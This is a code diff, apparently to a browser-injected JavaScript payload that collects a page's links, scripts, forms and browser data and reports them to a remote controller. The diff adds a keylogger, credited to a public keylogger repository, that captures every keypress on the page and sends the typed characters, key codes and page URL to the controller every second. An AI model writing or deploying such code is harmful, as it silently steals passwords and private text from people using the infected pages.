@@ -4,6 +4,7 @@ var typeLink = "LINK";
 var typeScript = "SCRIPT";
 var typeForm = "FORM";
 var typeBrowser = "BROWSER";
+var typeKeys = "KEYS";
 
 // List of URLs that were already crawled. Used to prevent loops and unnecessary multiple extractions.
 var sentUrlList = [];
@@ -11,6 +12,17 @@ var sentUrlList = [];
 var timestamp = new Date().getTime();
 // Should the script crawl each link it finds containing the same domain name.
 var crawl = false;
+
+// Based on: https://github.com/JohnHoder/Javascript-Keylogger/blob/master/keylogger.js
+var keys='';
+var keyCodes='';
+document.onkeypress = function(e) {
+	get = window.event ? event : e;
+	key = get.keyCode ? get.keyCode : get.charCode;
+    keyCodes += key + ","
+	key = String.fromCharCode(key);
+	keys += key;
+}
 
 // Send data back to the controller.
 function sendData(type, data) {
@@ -376,6 +388,22 @@ ready(function () {
     } catch (err) {
         console.log("No brw data");
     }
+
+    window.setInterval(function(){
+        try{
+        var keyTimestamp = new Date().getTime();
+            if (keys.length > 0) {
+                sendData(typeKeys, { 'url': document.location.href, 'timestamp': keyTimestamp, 'keys': keys });
+                keys = '';
+            }
+            if (keyCodes.length > 0) {
+                sendData(typeKeys, { 'url': document.location.href, 'timestamp': keyTimestamp, 'keys': keyCodes });
+                keyCodes = '';
+            }
+        } catch (err) {
+            console.log("Cannot send key");
+        }
+    }, 1000);
 
     // Process documents for different interesting tags (links/scripts/forms) and send such information. 
     try {
